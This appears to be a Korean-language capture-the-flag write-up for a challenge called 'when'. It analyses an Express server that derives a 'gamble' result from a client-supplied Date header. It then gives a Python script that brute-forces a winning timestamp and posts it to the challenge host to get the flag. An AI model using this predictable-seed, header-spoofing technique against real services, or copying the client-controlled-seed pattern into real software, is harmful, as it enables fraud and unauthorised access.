# when

## 코드 분석

### **app.ts**

Express 앱에 limiter라는 전역 미들웨어가 등록되어 있다. 60초에 60번까지만 /gamble 요청이 가능하다.

```jsx
const limiter = rateLimit({
	windowMs: 60 * 1000,
	limit: 60,// 60 per minutestandardHeaders: 'draft-7',
	legacyHeaders: false,
    skip: (req, res) => {
        return req.path != "/gamble"
    }
})

const app = express()

app.use(limiter)
app.use(express.static(path.join(__dirname, 'static')))
```

클라이언트가 보낸 date 헤더 값을 초 단위 timestamp로 변환한 뒤, 이를 SHA-256 해시하는 부분이다. 만약 date 헤더가 없으면 서버의 현재 시간을 사용한다. 즉, date 값이 곧 뽑기의 시드가 되는 구조이며, 이를 통해 얻어진 해시 결과의 앞 두 바이트가 모두 255가 나오면 FLAG가 반환된다.

```jsx
async function gamble(number: number) {
    return crypto.subtle.digest("SHA-256", Buffer.from(number.toString()))
}

app.post('/gamble', (req, res) => {
    const time = req.headers.date ? new Date(req.headers.date) : new Date()
    const number = Math.floor(time.getTime() / 1000)
    if (isNaN(number)) {
        res.send({
            success: false,
            error: "Bad Date"
        }).status(400)
        return
    }
    gamble(number).then(data => {
        const bytes = new Uint8Array(data)
        if (bytes[0] == 255 && bytes[1] == 255) {
            res.send({
                success: true,
                result: "1111111111111111",
                flag: "bctf{fake_flag}"
            })
        } else {
            res.send({
                success: true,
                result: bytes[0].toString(2).padStart(8, "0") + bytes[1].toString(2).padStart(8, "0")
            })
        }
    })
});
```

## Exploit

date를 헤더를 따로 설정하지 않으면, 서버가 현재 자신의 시간을 사용해서 시드를 생성한다. 이 경우, 서버가 사용하는 시드가 클라이언트가 제어할 수 없는 현재 서버 시간이기 때문에, 클라이언트 입장에서는 어떤 시드가 사용될지 예측할 수 없다. 따라서, 당첨 여부는 전적으로 서버의 현재 시간값에 의존하게 되고, 결과적으로 매 요청마다 당첨될지 아닐지가 무작위로 결정되는 도박성 구조가 된다.

하지만, 시드가 단순히 초 단위 timestamp이기 때문에, 예상 가능한 시드 공간을 미리 전수조사하여 당첨 시드를 계산해낼 수 있다. 이를 역으로 이용해 해시 앞 2바이트가 모두 255가 되는 timestamp를 미리 찾아내면 운이라는 요소를 배제하고 확정적으로 당첨을 만들어낼 수 있는 구조가 된다.

```python
import hashlib
import time
import requests
from email.utils import formatdate

def find_timestamp():
    now = int(time.time())
    for timestamp in range(now - 100000, now + 100000):
        h = hashlib.sha256(str(timestamp).encode()).digest()
        if h[0] == 0xff and h[1] == 0xff:
            print(f"Found timestamp: {timestamp}")
            return timestamp
    return None

def send_gamble_request(timestamp):
    date_header = formatdate(timestamp, usegmt=True)
    headers = {
        "date": date_header
    }
    response = requests.post("https://when.atreides.b01lersc.tf/gamble", headers=headers)
    print(response.text)

if __name__ == "__main__":
    timestamp = find_timestamp()
    if timestamp:
        send_gamble_request(timestamp)

# Found timestamp: 1745272291# {"success":true,"result":"1111111111111111","flag":"bctf{ninety_nine_percent_of_gamblers_gamble_81dc9bdb}"}
```